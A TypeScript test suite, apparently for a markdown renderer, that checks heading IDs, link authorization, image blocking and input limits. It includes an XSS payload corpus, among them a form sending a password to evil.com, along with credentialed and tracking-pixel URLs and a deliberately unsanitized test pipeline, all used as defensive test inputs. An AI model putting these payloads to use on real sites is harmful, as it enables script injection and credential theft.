import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkRehype from 'remark-rehype';
import rehypeStringify from 'rehype-stringify';
import {
  parseMarkdown,
  slugifyHeading,
  formatHeadingAnchor,
  MarkdownLimitError,
  type MarkdownParseOptions,
  type LinkResolverResult,
  type AssetResolverResult
} from '../lib/markdown.js';

describe('P1 Markdown Qualification & Security Suite', () => {

  // 1. Heading ID & Fragment Href Exact Alignment with 'h-' Clobber Protection
  it('renders deterministic semantic HTML with exact heading IDs matching heading.href and block IDs', async () => {
    const input = `# Overview\n\nThis is a standard paragraph with **bold** and *italic* text.\n\n## Overview\n\nDuplicate heading paragraph.\n\n### Technical Details\n\nThird paragraph.`;
    const res = await parseMarkdown(input);

    assert.equal(res.headings.length, 3);

    // Heading 1: h-overview
    assert.equal(res.headings[0].id, 'h-overview');
    assert.equal(res.headings[0].href, '#h-overview');
    assert.ok(res.html.includes('<h1 data-block-id="b0" id="h-overview">Overview</h1>'), 'HTML tag must have id="h-overview" and block ID b0');

    // Heading 2 (Duplicate): h-overview-1
    assert.equal(res.headings[1].id, 'h-overview-1');
    assert.equal(res.headings[1].href, '#h-overview-1');
    assert.ok(res.html.includes('id="h-overview-1">Overview</h2>'), 'HTML tag must have id="h-overview-1"');

    // Heading 3: h-technical-details
    assert.equal(res.headings[2].id, 'h-technical-details');
    assert.equal(res.headings[2].href, '#h-technical-details');
    assert.ok(res.html.includes('id="h-technical-details">Technical Details</h3>'));

    // Block ID verification
    assert.ok(res.html.includes('data-block-id="b0"'));
    assert.ok(res.html.includes('data-block-id="b1"'));
    assert.ok(res.plainText.includes('This is a standard paragraph with bold and italic text.'));

    // Strongly-typed HAST verification
    assert.equal(res.ast.type, 'root');
    assert.ok(Array.isArray(res.ast.children));
  });

  // 2. GFM Tables and Tasklists
  it('renders GFM tables and tasklists safely', async () => {
    const input = `
| Step | Action | Status |
| :--- | :----: | -----: |
| 1    | Intake | Done   |
| 2    | Review | Open   |

- [x] Completed task
- [ ] Pending task
`;
    const res = await parseMarkdown(input);
    assert.ok(res.html.includes('<table'));
    assert.ok(res.html.includes('<th align="left">Step</th>'));
    assert.ok(res.html.includes('<td align="left">1</td>'));
    assert.ok(res.html.includes('type="checkbox"'));
    assert.ok(res.html.includes('disabled'));
  });

  // 3. Wikilinks, Fail-Closed Relative Links, and Repeated Occurrence Edges
  it('resolves authorized wikilinks via DAL hrefs, tracks repeated edges, and fails closed when resolver is absent or unauthorized', async () => {
    const mockDb: Record<string, LinkResolverResult> = {
      'site-spec': {
        id: 'doc_site_spec',
        slug: 'site-spec',
        href: '/reader/site-spec', // Verified route from DAL
        title: 'Site Specification',
        isAuthorized: true
      },
      'private-finance': {
        id: 'doc_priv_fin',
        slug: 'private-finance',
        href: '/reader/private-finance',
        title: 'Private Financials',
        isAuthorized: false
      }
    };

    const options: MarkdownParseOptions = {
      resolveLink: (target) => mockDb[target] || null
    };

    const input = `
Refer to [[site-spec|Project Specification]] for details.
Also see [[site-spec#section-2]] again in the same document.
Do not disclose [[private-finance|Financial Summary]].
Unknown item [[missing-item|Missing Resource]].
Relative link [Doc Link](./unregistered-doc.md).
`;

    const res = await parseMarkdown(input, options);

    // Link occurrences checks (4 wikilinks + 1 relative link)
    assert.equal(res.links.length, 5);

    // Occurrence 1: site-spec
    assert.equal(res.links[0].target, 'site-spec');
    assert.equal(res.links[0].alias, 'Project Specification');
    assert.equal(res.links[0].href, '/reader/site-spec');
    assert.equal(res.links[0].isAuthorized, true);
    assert.equal(res.links[0].isBroken, false);
    assert.equal(res.links[0].occurrenceIndex, 1);

    // Occurrence 2: repeated site-spec edge with anchor
    assert.equal(res.links[1].target, 'site-spec');
    assert.equal(res.links[1].alias, 'site-spec');
    assert.equal(res.links[1].anchor, 'section-2');
    assert.equal(res.links[1].href, '/reader/site-spec#h-section-2');
    assert.equal(res.links[1].occurrenceIndex, 2);

    // Occurrence 3: unauthorized target
    assert.equal(res.links[2].target, 'private-finance');
    assert.equal(res.links[2].isAuthorized, false);

    // Occurrence 4: broken target
    assert.equal(res.links[3].target, 'missing-item');
    assert.equal(res.links[3].isBroken, true);

    // Occurrence 5: unresolved relative link (fails closed)
    assert.equal(res.links[4].type, 'relative');
    assert.equal(res.links[4].isAuthorized, false);

    // HTML Rendering Checks:
    assert.ok(res.html.includes('href="/reader/site-spec"'));
    assert.ok(res.html.includes('href="/reader/site-spec#h-section-2"'));
    assert.ok(!res.html.includes('/workspace/')); // No invented routes

    // Unauthorized link must NOT render active anchor and must NOT leak private target title
    assert.ok(!res.html.includes('href="/reader/private-finance"'));
    assert.ok(res.html.includes('class="inert-link inert-unauthorized"'));
    assert.ok(!res.html.includes('Private Financials')); // Private title must not leak
  });

  // 4. External Links with rel="noopener noreferrer", visible marker & credential rejection (CNT-004)
  it('enforces CNT-004 external links security, rejects credentialed URLs, and marks external links', async () => {
    const input = `
[Safe External](https://example.com/docs)
[Credentialed URL](https://user:password@evil.com/leak)
[HTTP Credentialed](http://admin:secret@site.com/admin)
`;
    const res = await parseMarkdown(input);

    // Safe external link: has rel="noopener noreferrer", class="external-link", data-external="true"
    assert.ok(res.html.includes('href="https://example.com/docs"'));
    assert.ok(res.html.includes('rel="noopener noreferrer"'));
    assert.ok(res.html.includes('class="external-link"'));
    assert.ok(res.html.includes('data-external="true"'));

    // Credentialed URLs must be REJECTED into inert spans
    assert.ok(!res.html.includes('https://user:password@evil.com'));
    assert.ok(!res.html.includes('http://admin:secret@site.com'));
    assert.ok(res.html.includes('<span class="inert-link inert-unauthorized" data-status="unauthorized">Credentialed URL</span>'));
    assert.ok(res.html.includes('<span class="inert-link inert-unauthorized" data-status="unauthorized">HTTP Credentialed</span>'));
  });

  // 5. Remote & Relative Images Fail-Closed Prohibition
  it('strictly blocks remote and arbitrary relative images into inert spans', async () => {
    const input = `
![Tracking Pixel](https://analytics.evil.com/pixel.gif)
![External Photo](http://insecure.com/photo.jpg)
![Protocol Relative](//cdn.com/asset.png)
![Relative Unknown](images/local-photo.png)
`;
    const res = await parseMarkdown(input);

    // Must NOT contain any <img ...>
    assert.ok(!res.html.includes('<img'));
    assert.ok(res.html.includes('class="blocked-image"'));
    assert.ok(res.html.includes('data-reason="remote-image-blocked"'));
  });

  // 6. Authorized Internal Asset Images via DAL
  it('renders authorized internal assets and blocks unauthorized assets', async () => {
    const mockAssets: Record<string, AssetResolverResult> = {
      'asset-valid': { id: 'asset-valid', href: '/api/assets/asset-valid', isAuthorized: true },
      'asset-forbidden': { id: 'asset-forbidden', isAuthorized: false }
    };

    const options: MarkdownParseOptions = {
      resolveAsset: (id) => mockAssets[id] || null
    };

    const input = `
![Valid Asset](asset:asset-valid)
![Forbidden Asset](asset:asset-forbidden)
`;
    const res = await parseMarkdown(input, options);

    assert.ok(res.html.includes('src="/api/assets/asset-valid"'));
    assert.ok(res.html.includes('data-reason="asset-unavailable"'));
  });

  // 7. Reference Normalization (linkReference / imageReference / definition)
  it('normalizes linkReference and imageReference through the exact same fail-closed security policies', async () => {
    const mockAssets: Record<string, AssetResolverResult> = {
      'auth-asset': { id: 'auth-asset', href: '/api/assets/auth-asset', isAuthorized: true }
    };

    const options: MarkdownParseOptions = {
      resolveAsset: (id) => mockAssets[id] || null,
      resolveLink: (t) => t === 'auth-doc' ? { id: 'auth-doc', slug: 'auth-doc', href: '/reader/auth-doc', isAuthorized: true } : null
    };

    const input = `
![Authorized Image][img1]
![Unauthorized Image][img2]
![Remote Image Reference][img3]

[Authorized Link][link1]
[Unauthorized Secret Link][link2]

[Same Doc Fragment Jump](#introduction)
[Same Doc Hindi Fragment Jump](#सामग्री)

[img1]: asset:auth-asset
[img2]: /api/assets/secret-private-asset
[img3]: https://evil.com/leak.png
[link1]: auth-doc
[link2]: secret.md
`;

    const res = await parseMarkdown(input, options);

    // Authorized asset reference renders <img>
    assert.ok(res.html.includes('src="/api/assets/auth-asset"'));
    // Unauthorized asset reference blocked
    assert.ok(res.html.includes('data-reason="asset-unavailable"'));
    // Remote image reference blocked
    assert.ok(res.html.includes('data-reason="remote-image-blocked"'));
    // No live remote <img>
    assert.ok(!res.html.includes('src="https://evil.com'));

    // Authorized link renders active anchor
    assert.ok(res.html.includes('href="/reader/auth-doc"'));
    // Unauthorized relative link reference blocked into inert span
    assert.ok(res.html.includes('class="inert-link inert-unauthorized"'));
    assert.ok(!res.html.includes('href="secret.md"'));

    // Same-document fragment jumps mapped to h-
    assert.ok(res.html.includes('href="#h-introduction"'));
    assert.ok(decodeURIComponent(res.html).includes('href="#h-सामग्री"'));
  });

  // 8. XSS Attack Corpus Neutralization
  it('neutralizes all XSS, script, iframe, object, form, and protocol attacks', async () => {
    const attackCorpus = [
      '<script>alert("xss")</script>',
      '<iframe src="https://evil.com/login"></iframe>',
      '<object data="evil.swf"></object>',
      '<embed src="evil.pdf">',
      '<svg onload="alert(1)"><circle r="5"/></svg>',
      '<math><mtext><form><button formaction="javascript:alert(1)">CLICK</button></form></mtext></math>',
      '<form action="https://evil.com/steal"><input type="password" name="pwd"/></form>',
      '<style>body { background: red; }</style>',
      '<a href="javascript:alert(1)">Click Me</a>',
      '<a href="jav&#x09;ascript:alert(1)">Entity Click</a>',
      '<a href="data:text/html,<script>alert(1)</script>">Data Link</a>',
      '<a href="vbscript:msgbox(1)">VBScript Link</a>',
      '<div onclick="alert(1)" onmouseover="alert(1)" onerror="alert(1)">Hover Me</div>',
      '{(() => alert("JSX Injection"))()}',
      '<Component onClick={() => {}} />',
      'import fs from "node:fs";'
    ];

    for (const attack of attackCorpus) {
      const res = await parseMarkdown(attack);
      assert.ok(!res.html.includes('<script'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('<iframe'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('<object'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('<embed'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('<svg'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('<math'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('<form'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('<style'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('javascript:'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('data:text/html'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('vbscript:'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('onclick'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('onload'), `Failed on: ${attack}`);
      assert.ok(!res.html.includes('onerror'), `Failed on: ${attack}`);
    }
  });

  // 9. Resource Bounds & Abuse Limits
  it('enforces maximum input byte limits', async () => {
    const hugeInput = 'A'.repeat(1024);
    await assert.rejects(
      async () => {
        await parseMarkdown(hugeInput, { maxInputBytes: 500 });
      },
      (err: any) => {
        assert.ok(err instanceof MarkdownLimitError);
        assert.equal(err.code, 'INPUT_TOO_LARGE');
        return true;
      }
    );
  });

  it('enforces maximum node count limits', async () => {
    const manyNodes = Array.from({ length: 50 }, (_, i) => `- Item ${i}`).join('\n');
    await assert.rejects(
      async () => {
        await parseMarkdown(manyNodes, { maxNodeCount: 20 });
      },
      (err: any) => {
        assert.ok(err instanceof MarkdownLimitError);
        assert.equal(err.code, 'TOO_MANY_NODES');
        return true;
      }
    );
  });

  it('enforces maximum nesting depth limits', async () => {
    const deeplyNested = '> '.repeat(40) + 'Deep text';
    await assert.rejects(
      async () => {
        await parseMarkdown(deeplyNested, { maxDepth: 15 });
      },
      (err: any) => {
        assert.ok(err instanceof MarkdownLimitError);
        assert.equal(err.code, 'EXCESSIVE_DEPTH');
        return true;
      }
    );
  });

  // 10. Unicode & Devanagari Hindi Fixtures with Exact Heading ID/Href Alignment
  it('correctly handles Devanagari Hindi typography and aligns heading IDs and hrefs with h- prefix', async () => {
    const hindiInput = `
# साइट-टू-स्टोर मटेरियल फ्लो

साइट इंजीनियर व्हाट्सएप चैटबॉट से स्टोर मैनेजर को मटेरियल रिक्वेस्ट भेजेगा।

## इन्वेंटरी और HSN कोड

हर आइटम का HSN/प्रोडक्ट कोड फीड होगा:
- सरिया (8mm, 10mm, 12mm)
- वायर (कॉपर, थ्री-कोर)

## इन्वेंटरी और HSN कोड

डुप्लिकेट हेडिंग टेस्ट।
`;
    const res = await parseMarkdown(hindiInput);

    assert.equal(res.headings.length, 3);

    // Heading 1
    assert.equal(res.headings[0].text, 'साइट-टू-स्टोर मटेरियल फ्लो');
    assert.equal(res.headings[0].id, 'h-साइट-टू-स्टोर-मटेरियल-फ्लो');
    assert.equal(res.headings[0].href, '#h-साइट-टू-स्टोर-मटेरियल-फ्लो');
    assert.ok(res.html.includes('id="h-साइट-टू-स्टोर-मटेरियल-फ्लो"'), 'HTML must contain id="h-साइट-टू-स्टोर-मटेरियल-फ्लो" matching heading.id');

    // Heading 2
    assert.equal(res.headings[1].text, 'इन्वेंटरी और HSN कोड');
    assert.equal(res.headings[1].id, 'h-इन्वेंटरी-और-hsn-कोड');
    assert.equal(res.headings[1].href, '#h-इन्वेंटरी-और-hsn-कोड');
    assert.ok(res.html.includes('id="h-इन्वेंटरी-और-hsn-कोड"'));

    // Heading 3 (Duplicate Hindi)
    assert.equal(res.headings[2].text, 'इन्वेंटरी और HSN कोड');
    assert.equal(res.headings[2].id, 'h-इन्वेंटरी-और-hsn-कोड-1');
    assert.equal(res.headings[2].href, '#h-इन्वेंटरी-और-hsn-कोड-1');
    assert.ok(res.html.includes('id="h-इन्वेंटरी-और-hsn-कोड-1"'));

    // Plain text search string preservation
    assert.ok(res.plainText.includes('साइट इंजीनियर व्हाट्सएप चैटबॉट'));
    assert.ok(res.plainText.includes('सरिया (8mm, 10mm, 12mm)'));
  });

  // 11. Sabotage Sanitizer Control (Mutation Testing / AC-REL-002) - TEST-ONLY HARNESS
  it('sabotage sanitizer control: test-only wrapper proves security assertions fail when sanitizer is disabled', async () => {
    const maliciousInput = '<p>Normal text</p><script>alert("hacked")</script>';

    // Normal safe execution: production API MUST strip script
    const safeRes = await parseMarkdown(maliciousInput);
    assert.ok(!safeRes.html.includes('<script>'), 'Production parseMarkdown must strip script tag');
    assert.ok(!safeRes.html.includes('alert("hacked")'), 'Production parseMarkdown must strip script content');

    // Test-only mutant pipeline: intentionally omits rehypeSanitize
    const testMutantPipeline = unified()
      .use(remarkParse)
      .use(remarkRehype, { allowDangerousHtml: true })
      .use(rehypeStringify, { allowDangerousHtml: true });

    const sabotagedFile = await testMutantPipeline.process(maliciousInput);
    const sabotagedHtml = String(sabotagedFile);

    assert.ok(sabotagedHtml.includes('<script>alert("hacked")</script>'), 'Mutant pipeline without sanitizer allows script through');

    // Prove that a security assertion fails under mutant conditions (mutation testing receipt)
    assert.throws(() => {
      assert.ok(!sabotagedHtml.includes('<script>'), 'Security assertion must fail on mutant');
    }, /Security assertion must fail on mutant/);
  });

});
